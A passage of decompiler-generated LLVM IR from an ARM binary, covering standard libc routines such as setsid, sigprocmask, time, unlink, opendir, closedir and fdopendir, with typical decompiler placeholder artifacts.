  store i32 %v3_115ac, i32* %stack_var_-28, align 4
  %v6_115ac = load i32, i32* @r5, align 4
  %v9_115ac = load i32, i32* @r6, align 4
  %v12_115ac = load i32, i32* @r7, align 4
  %v15_115ac = load i32, i32* @r8, align 4
  %v18_115ac = load i32, i32* @sl, align 4
  %v21_115ac = load i32, i32* @lr, align 4
  %v4_115bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_115c4 = icmp eq i32 %v4_115bc, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_115c4, label %dec_label_pc_115e0, label %entry.dec_label_pc_115ec_crit_edge

entry.dec_label_pc_115ec_crit_edge:               ; preds = %entry
  br label %dec_label_pc_115ec

dec_label_pc_115e0:                               ; preds = %entry
  store i32 %v3_115ac, i32* @r4, align 4
  store i32 %v9_115ac, i32* @r6, align 4
  store i32 %v12_115ac, i32* @r7, align 4
  store i32 %v15_115ac, i32* @r8, align 4
  store i32 %v18_115ac, i32* %sl.global-to-local, align 4
  %v0_115e8 = call i32 @__syscall_select()
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %entry.dec_label_pc_115ec_crit_edge, %dec_label_pc_115e0
  %v0_115ec = call i32 @__libc_enable_asynccancel()
  %v0_115f0 = load i32, i32* @r6, align 4
  store i32 %v0_115f0, i32* @r1, align 4
  store i32 %v0_115ec, i32* @r5, align 4
  %v0_11600 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_11600, i32* @r0, align 4
  %v0_11608 = call i32 @__syscall_select()
  store i32 %v0_11608, i32* @r4, align 4
  %v0_11610 = load i32, i32* @r5, align 4
  %v1_11614 = call i32 @__libc_disable_asynccancel(i32 %v0_11610)
  %v0_11618 = load i32, i32* @r4, align 4
  %v2_11620 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_11620, i32* @r4, align 4
  store i32 %v6_115ac, i32* @r5, align 4
  store i32 %v9_115ac, i32* @r6, align 4
  store i32 %v12_115ac, i32* @r7, align 4
  store i32 %v15_115ac, i32* @r8, align 4
  store i32 %v18_115ac, i32* @sl, align 4
  store i32 %v21_115ac, i32* @lr, align 4
  ret i32 %v0_11618

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115ec, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11630 = load i32, i32* @r7, align 4
  store i32 %v3_11630, i32* %stack_var_-8, align 4
  %v0_1163c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1163c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1163c, -4095
  br i1 %tmp, label %dec_label_pc_11664, label %dec_label_pc_1164c

dec_label_pc_1164c:                               ; preds = %entry
  %v0_11650 = call i32 @__aeabi_read_tp()
  %v3_11654 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11654 = sext i16 %v3_11654 to i32
  %v0_11658 = load i32, i32* %r2.global-to-local, align 4
  %v1_11658 = sub i32 0, %v0_11658
  store i32 %v1_11658, i32* %r2.global-to-local, align 4
  %v3_1165c = add i32 %v4_11654, %v0_11650
  %v4_1165c = inttoptr i32 %v3_1165c to i32*
  store i32 %v1_11658, i32* %v4_1165c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11664.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %entry, %dec_label_pc_1164c
  %v1_11668 = phi i32 [ %v0_1163c, %entry ], [ -1, %dec_label_pc_1164c ]
  %v2_11664 = phi i32 [ %v3_11630, %entry ], [ %v2_11664.pre, %dec_label_pc_1164c ]
  store i32 %v2_11664, i32* @r7, align 4
  ret i32 %v1_11668

; uselistorder directives
  uselistorder i32 %v0_1163c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11664, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_11674 = icmp eq i32* %arg2, null
  br i1 %v2_11674, label %dec_label_pc_116b8, label %dec_label_pc_11688

dec_label_pc_11688:                               ; preds = %entry
  %v2_11688 = load i32, i32* %arg2, align 4
  %v1_1168c = icmp slt i32 %v2_11688, 0
  br i1 %v1_1168c, label %dec_label_pc_116a0, label %dec_label_pc_11694

dec_label_pc_11694:                               ; preds = %dec_label_pc_11688
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_11694 = load i32, i32* %.pre3, align 4
  %v1_11698 = urem i32 %v3_11694, 2
  %v2_11698 = icmp eq i32 %v1_11698, 0
  br i1 %v2_11698, label %dec_label_pc_116b8, label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %dec_label_pc_11688, %dec_label_pc_11694
  %v2_116a0 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_116a0 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_116b8

dec_label_pc_116b8:                               ; preds = %dec_label_pc_11694, %entry, %dec_label_pc_116a0
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_116ec, label %dec_label_pc_116d4

dec_label_pc_116d4:                               ; preds = %dec_label_pc_116b8
  %v1_116d8 = sub i32 0, %arg1
  %v3_116dc = load i16, i16* @global_var_2229c.359, align 2
  %v4_116dc = sext i16 %v3_116dc to i32
  %v0_116e0 = call i32 @__aeabi_read_tp()
  %v3_116e4 = add i32 %v4_116dc, %v0_116e0
  %v4_116e4 = inttoptr i32 %v3_116e4 to i32*
  store i32 %v1_116d8, i32* %v4_116e4, align 4
  br label %dec_label_pc_116ec

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116b8, %dec_label_pc_116d4
  %v1_116f4 = phi i32 [ %arg1, %dec_label_pc_116b8 ], [ -1, %dec_label_pc_116d4 ]
  ret i32 %v1_116f4

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_116ec, { 1, 0 }
  uselistorder label %dec_label_pc_116b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116a0, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_11700 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_11710 = call i32 @gettimeofday(i32 %v2_11700, i32 0)
  %v2_11714 = load i32, i32* %stack_var_-16, align 4
  %v2_11718 = icmp eq i32* %arg1, null
  br i1 %v2_11718, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_11714, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_11714

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1172c = load i32, i32* @r7, align 4
  store i32 %v3_1172c, i32* %stack_var_-8, align 4
  %v0_11738 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11738, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11738, -4095
  br i1 %tmp, label %dec_label_pc_11760, label %dec_label_pc_11748

dec_label_pc_11748:                               ; preds = %entry
  %v0_1174c = call i32 @__aeabi_read_tp()
  %v3_11750 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11750 = sext i16 %v3_11750 to i32
  %v0_11754 = load i32, i32* %r2.global-to-local, align 4
  %v1_11754 = sub i32 0, %v0_11754
  store i32 %v1_11754, i32* %r2.global-to-local, align 4
  %v3_11758 = add i32 %v4_11750, %v0_1174c
  %v4_11758 = inttoptr i32 %v3_11758 to i32*
  store i32 %v1_11754, i32* %v4_11758, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11760.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11760

dec_label_pc_11760:                               ; preds = %entry, %dec_label_pc_11748
  %v1_11764 = phi i32 [ %v0_11738, %entry ], [ -1, %dec_label_pc_11748 ]
  %v2_11760 = phi i32 [ %v3_1172c, %entry ], [ %v2_11760.pre, %dec_label_pc_11748 ]
  store i32 %v2_11760, i32* @r7, align 4
  ret i32 %v1_11764

; uselistorder directives
  uselistorder i32 %v0_11738, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11760, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1176c = load i32, i32* @r4, align 4
  store i32 %v3_1176c, i32* %stack_var_-24, align 4
  %v9_1176c = load i32, i32* @r6, align 4
  %v12_1176c = load i32, i32* @r7, align 4
  %v15_1176c = load i32, i32* @r8, align 4
  %v18_1176c = load i32, i32* @lr, align 4
  %v2_11770 = load i32, i32* %arg1, align 4
  store i32 %v2_11770, i32* %r3.global-to-local, align 4
  %v3_11778 = icmp eq i32 %v2_11770, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r6, align 4
  br i1 %v3_11778, label %dec_label_pc_1178c, label %dec_label_pc_117a8

dec_label_pc_1178c:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10b00.382 to i32), i32* %r2.global-to-local, align 4
  %v0_11790 = call i32 @__aeabi_read_tp()
  %v3_11794 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11794 = sext i16 %v3_11794 to i32
  store i32 %v4_11794, i32* %r2.global-to-local, align 4
  %v0_11798 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_11798, i32* %r1.global-to-local, align 4
  %v1_1179c = add i32 %v0_11798, 10
  store i32 %v1_1179c, i32* %r3.global-to-local, align 4
  %v3_117a0 = add i32 %v4_11794, %v0_11790
  %v4_117a0 = inttoptr i32 %v3_117a0 to i32*
  store i32 %v1_1179c, i32* %v4_117a0, align 4
  %v0_11850.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11850

dec_label_pc_117a8:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_117ac = add i32 %tmp, 24
  store i32 %v1_117ac, i32* %r2.global-to-local, align 4
  %v4_117b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 68) to i32*), align 4
  store i32 %v4_117b4, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_117c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_117c0)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_117d8 = load i32, i32* @r6, align 4
  %v2_117d8 = add i32 %v0_117d8, 16
  %v3_117d8 = inttoptr i32 %v2_117d8 to i32*
  %v4_117d8 = load i32, i32* %v3_117d8, align 4
  call void @__pseudo_branch(i32 %v4_117d8)
  %v0_117e4 = load i32, i32* @r7, align 4
  %v1_117e4 = inttoptr i32 %v0_117e4 to i32*
  %v2_117e4 = load i32, i32* %v1_117e4, align 4
  store i32 %v2_117e4, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_117f4 = load i32, i32* @r8, align 4
  store i32 %v0_117f4, i32* %v1_117e4, align 4
  %v0_117f8 = load i32, i32* @r6, align 4
  %v1_117f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_117f8 = add i32 %v1_117f8, %v0_117f8
  %v3_117f8 = inttoptr i32 %v2_117f8 to i32*
  %v4_117f8 = load i32, i32* %v3_117f8, align 4
  store i32 ptrtoint (i32* @global_var_11804.387 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_117f8)
  %v0_11804 = load i32, i32* @r7, align 4
  %v1_11804 = add i32 %v0_11804, 12
  %v2_11804 = inttoptr i32 %v1_11804 to i32*
  %v3_11804 = load i32, i32* %v2_11804, align 4
  store i32 %v3_11804, i32* @r0, align 4
  %v0_11808 = call i32 @free()
  %v0_1180c = load i32, i32* @r7, align 4
  store i32 %v0_1180c, i32* @r0, align 4
  %v0_11810 = call i32 @free()
  %v0_11818 = load i32, i32* @r4, align 4
  store i32 %v0_11818, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_11818, -4095
  br i1 %tmp11, label %dec_label_pc_1184c, label %dec_label_pc_11834

dec_label_pc_11834:                               ; preds = %dec_label_pc_117a8
  store i32 ptrtoint (i32* @global_var_10a58.389 to i32), i32* %r3.global-to-local, align 4
  %v0_11838 = call i32 @__aeabi_read_tp()
  %v3_1183c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1183c = sext i16 %v3_1183c to i32
  store i32 %v4_1183c, i32* %r3.global-to-local, align 4
  %v0_11840 = load i32, i32* %r2.global-to-local, align 4
  %v1_11840 = sub i32 0, %v0_11840
  store i32 %v1_11840, i32* %r2.global-to-local, align 4
  %v3_11844 = add i32 %v4_1183c, %v0_11838
  %v4_11844 = inttoptr i32 %v3_11844 to i32*
  store i32 %v1_11840, i32* %v4_11844, align 4
  %v0_11848 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1184c

dec_label_pc_1184c:                               ; preds = %dec_label_pc_117a8, %dec_label_pc_11834
  %v0_1184c = phi i32 [ %v0_11818, %dec_label_pc_117a8 ], [ %v0_11848, %dec_label_pc_11834 ]
  store i32 %v0_1184c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11850

dec_label_pc_11850:                               ; preds = %dec_label_pc_1178c, %dec_label_pc_1184c
  %v0_11850 = phi i32 [ %v0_11850.pre, %dec_label_pc_1178c ], [ %v0_1184c, %dec_label_pc_1184c ]
  %v2_11858 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11858, i32* @r4, align 4
  store i32 %v9_1176c, i32* @r6, align 4
  store i32 %v12_1176c, i32* @r7, align 4
  store i32 %v15_1176c, i32* @r8, align 4
  store i32 %v18_1176c, i32* @lr, align 4
  ret i32 %v0_11850

; uselistorder directives
  uselistorder i32 %v0_11818, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11850, { 1, 0 }
  uselistorder label %dec_label_pc_1184c, { 1, 0 }
}

define i32 @function_11868(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11868:
  %v0_11868 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11868, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11868
  %v2_11878 = load i32, i32* @r8, align 4
  %v3_11878 = load i32, i32* @sl, align 4
  %v8_11878 = ashr i32 %v2_11878, %v3_11878
  %v9_11878 = and i32 %v8_11878, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11868, %bb
  %v10_11878 = phi i32 [ %arg1, %dec_label_pc_11868 ], [ %v9_11878, %bb ]
  ret i32 %v10_11878

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1187c = load i32, i32* @r4, align 4
  %v6_1187c = load i32, i32* @r5, align 4
  %v9_1187c = load i32, i32* @r6, align 4
  %v12_1187c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_11890 = call i32 @malloc()
  %v2_11898 = icmp eq i32 %v0_11890, 0
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r6, align 4
  br i1 %v2_11898, label %bb, label %dec_label_pc_118a8

bb:                                               ; preds = %entry
  br label %dec_label_pc_11934

dec_label_pc_118a8:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_118ac = load i32, i32* @r4, align 4
  %v2_118ac = icmp ugt i32 %v0_118ac, 511
  %v2_118b0 = add i32 %v0_11890, 4
  %v3_118b0 = inttoptr i32 %v2_118b0 to i32*
  store i32 0, i32* %v3_118b0, align 4
  %v0_118b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_118b4 = add i32 %v0_11890, 16
  %v3_118b4 = inttoptr i32 %v2_118b4 to i32*
  store i32 %v0_118b4, i32* %v3_118b4, align 4
  %v0_118b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_118b8 = add i32 %v0_11890, 8
  %v3_118b8 = inttoptr i32 %v2_118b8 to i32*
  store i32 %v0_118b8, i32* %v3_118b8, align 4
  br i1 %v2_118ac, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_118a8
  %v0_118c02 = load i32, i32* @r4, align 4
  %v2_118c03 = add i32 %v0_11890, 20
  %v3_118c04 = inttoptr i32 %v2_118c03 to i32*
  store i32 %v0_118c02, i32* %v3_118c04, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_118a8
  %v1_118bc = load i32, i32* %r3.global-to-local, align 4
  %v2_118bc = add i32 %v1_118bc, 512
  store i32 %v2_118bc, i32* %r3.global-to-local, align 4
  %v0_118c0 = load i32, i32* @r4, align 4
  %v2_118c0 = add i32 %v0_11890, 20
  %v3_118c0 = inttoptr i32 %v2_118c0 to i32*
  store i32 %v0_118c0, i32* %v3_118c0, align 4
  %v1_118c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_118c4, i32* %v3_118c0, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_11890, i32* @r5, align 4
  %v0_118cc = load i32, i32* @r7, align 4
  %v2_118cc = inttoptr i32 %v0_11890 to i32*
  store i32 %v0_118cc, i32* %v2_118cc, align 4
  %v0_118d0 = load i32, i32* @r5, align 4
  %v1_118d0 = add i32 %v0_118d0, 20
  %v2_118d0 = inttoptr i32 %v1_118d0 to i32*
  %v3_118d0 = load i32, i32* %v2_118d0, align 4
  store i32 %v3_118d0, i32* %r1.global-to-local, align 4
  %v2_118d8 = call i32 @calloc(i32 1, i32 %v3_118d0)
  %v2_118dc = icmp eq i32 %v2_118d8, 0
  store i32 %v2_118d8, i32* @r4, align 4
  %v1_118e4 = load i32, i32* @r5, align 4
  %v2_118e4 = add i32 %v1_118e4, 12
  %v3_118e4 = inttoptr i32 %v2_118e4 to i32*
  store i32 %v2_118d8, i32* %v3_118e4, align 4
  br i1 %v2_118dc, label %dec_label_pc_118ec, label %dec_label_pc_118fc

dec_label_pc_118ec:                               ; preds = %bb17
  %v0_118ec = load i32, i32* @r5, align 4
  store i32 %v0_118ec, i32* @r0, align 4
  %v0_118f0 = call i32 @free()
  %v0_118f4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_11934

dec_label_pc_118fc:                               ; preds = %bb17
  %v0_11900 = load i32, i32* @r6, align 4
  %v2_11900 = add i32 %v0_11900, -34036
  store i32 %v2_11900, i32* %r3.global-to-local, align 4
  %v1_11908 = inttoptr i32 %v2_11900 to i32*
  %v2_11908 = load i32, i32* %v1_11908, align 4
  %v3_11908 = add i32 %v0_11900, -34032
  %v4_11908 = inttoptr i32 %v3_11908 to i32*
  %v5_11908 = load i32, i32* %v4_11908, align 4
  store i32 %v5_11908, i32* %r1.global-to-local, align 4
  %v6_11908 = add i32 %v0_11900, -34028
  %v7_11908 = inttoptr i32 %v6_11908 to i32*
  %v8_11908 = load i32, i32* %v7_11908, align 4
  store i32 %v8_11908, i32* %r2.global-to-local, align 4
  %v9_11908 = add i32 %v0_11900, -34024
  %v10_11908 = inttoptr i32 %v9_11908 to i32*
  %v11_11908 = load i32, i32* %v10_11908, align 4
  store i32 %v11_11908, i32* %r3.global-to-local, align 4
  %v12_11908 = add i32 %v0_11900, -34020
  %v1_11914 = inttoptr i32 %v12_11908 to i32*
  %v2_11914 = load i32, i32* %v1_11914, align 4
  %v3_11914 = add i32 %v0_11900, -34016
  %v4_11914 = inttoptr i32 %v3_11914 to i32*
  %v5_11914 = load i32, i32* %v4_11914, align 4
  store i32 %v2_11914, i32* %stack_var_-32, align 4
  store i32 %v5_11908, i32* %r1.global-to-local, align 4
  store i32 %v8_11908, i32* %r2.global-to-local, align 4
  store i32 %v11_11908, i32* %r3.global-to-local, align 4
  %v0_11924 = load i32, i32* @r5, align 4
  %v1_11924 = add i32 %v0_11924, 24
  %v1_11928 = inttoptr i32 %v1_11924 to i32*
  store i32 %v2_11908, i32* %v1_11928, align 4
  %v3_11928 = add i32 %v0_11924, 28
  %v4_11928 = inttoptr i32 %v3_11928 to i32*
  %v5_11928 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11928, i32* %v4_11928, align 4
  %v6_11928 = add i32 %v0_11924, 32
  %v7_11928 = inttoptr i32 %v6_11928 to i32*
  %v8_11928 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_11928, i32* %v7_11928, align 4
  %v9_11928 = add i32 %v0_11924, 36
  %v10_11928 = inttoptr i32 %v9_11928 to i32*
  %v11_11928 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_11928, i32* %v10_11928, align 4
  %v12_11928 = add i32 %v0_11924, 40
  %v2_1192c = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_11914, i32* %r1.global-to-local, align 4
  %v1_11930 = inttoptr i32 %v12_11928 to i32*
  store i32 %v2_1192c, i32* %v1_11930, align 4
  %v3_11930 = add i32 %v0_11924, 44
  %v4_11930 = inttoptr i32 %v3_11930 to i32*
  %v5_11930 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11930, i32* %v4_11930, align 4
  %v0_11934.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11934

dec_label_pc_11934:                               ; preds = %bb, %dec_label_pc_118ec, %dec_label_pc_118fc
  %v0_11934 = phi i32 [ 0, %bb ], [ %v0_118f4, %dec_label_pc_118ec ], [ %v0_11934.pre, %dec_label_pc_118fc ]
  store i32 %v3_1187c, i32* @r4, align 4
  store i32 %v6_1187c, i32* @r5, align 4
  store i32 %v9_1187c, i32* @r6, align 4
  store i32 %v12_1187c, i32* @r7, align 4
  ret i32 %v0_11934

; uselistorder directives
  uselistorder i32 %v2_118d8, { 1, 0, 2 }
  uselistorder i32 %v0_11890, { 2, 1, 5, 0, 3, 6, 4, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_11934, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_1194c = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_11954 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_11984, label %dec_label_pc_1196c

dec_label_pc_1196c:                               ; preds = %entry
  %v0_11970 = call i32 @__aeabi_read_tp()
  %v3_11974 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11974 = sext i16 %v3_11974 to i32
  %v0_11978 = load i32, i32* %r2.global-to-local, align 4
  %v1_11978 = sub i32 0, %v0_11978
  store i32 %v1_11978, i32* %r2.global-to-local, align 4
  %v3_1197c = add i32 %v4_11974, %v0_11970
  %v4_1197c = inttoptr i32 %v3_1197c to i32*
  store i32 %v1_11978, i32* %v4_1197c, align 4
  br label %dec_label_pc_119a8

dec_label_pc_11984:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_11984 = icmp slt i32 %arg1, 0
  br i1 %v1_11984, label %dec_label_pc_119a8, label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %dec_label_pc_11984
  store i32 %v2_11954, i32* @r1, align 4
  %v0_11990 = call i32 @fstat()
  %v1_11994 = icmp slt i32 %v0_11990, 0
  br i1 %v1_11994, label %dec_label_pc_1199c, label %dec_label_pc_119b0

dec_label_pc_1199c:                               ; preds = %dec_label_pc_1198c
  br label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_1199c, %dec_label_pc_11984, %dec_label_pc_1196c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119f4

dec_label_pc_119b0:                               ; preds = %dec_label_pc_1198c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_119b8 = load i32, i32* @r7, align 4
  %v3_119bc = call i32 @__GI___fcntl_nocancel(i32 %v0_119b8, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_119c4 = load i32, i32* @r7, align 4
  %v2_119c8 = call i32 @fd_to_DIR(i32 %v0_119c4, i32 %tmp)
  store i32 %v2_119c8, i32* %r1.global-to-local, align 4
  %v2_119cc = icmp eq i32 %v2_119c8, 0
  br i1 %v2_119cc, label %dec_label_pc_119d4, label %dec_label_pc_119f4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119b0
  %v0_119e4 = call i32 @__aeabi_read_tp()
  %v3_119e8 = load i16, i16* @global_var_2229c.359, align 2
  %v4_119e8 = sext i16 %v3_119e8 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_119f0 = add i32 %v4_119e8, %v0_119e4
  %v4_119f0 = inttoptr i32 %v3_119f0 to i32*
  store i32 12, i32* %v4_119f0, align 4
  %v0_119f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119f4

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119b0, %dec_label_pc_119a8, %dec_label_pc_119d4
  %v0_119f4 = phi i32 [ %v2_119c8, %dec_label_pc_119b0 ], [ 0, %dec_label_pc_119a8 ], [ %v0_119f4.pre, %dec_label_pc_119d4 ]
  store i32 %v3_1194c, i32* @r7, align 4
  ret i32 %v0_119f4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_119f4, { 2, 0, 1 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a04:
  %v0_11a04 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a04, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_11a04
  %v2_11a0c = load i32, i32* @ip, align 4
  %v5_11a0c = udiv i32 %v2_11a0c, 131072
  %v6_11a0c = and i32 %v5_11a0c, %arg2
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11a04, %bb
  %v7_11a0c = phi i32 [ %arg1, %dec_label_pc_11a04 ], [ %v6_11a0c, %bb ]
  ret i32 %v7_11a0c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_11a14 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_11a14, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11a20 = call i32 @fstat()
  store i32 %v0_11a20, i32* @r5, align 4
  %v2_11a24 = icmp eq i32 %v0_11a20, 0
  br i1 %v2_11a24, label %dec_label_pc_11a2c, label %dec_label_pc_11aa4

dec_label_pc_11a2c:                               ; preds = %entry
  %v1_11a30 = and i32 %tmp4, 61440
  store i32 %v1_11a30, i32* @r3, align 4
  %v7_11a34 = icmp eq i32 %v1_11a30, 16384
  br i1 %v7_11a34, label %dec_label_pc_11a54, label %dec_label_pc_11a3c

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a2c
  %v0_11a40 = call i32 @__aeabi_read_tp()
  %v3_11a44 = load i16, i16* @global_var_2229c.359, align 2
  %v0_11a48 = load i32, i32* @r5, align 4
  store i32 %v0_11a48, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a88

dec_label_pc_11a54:                               ; preds = %dec_label_pc_11a2c
  %v0_11a54 = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
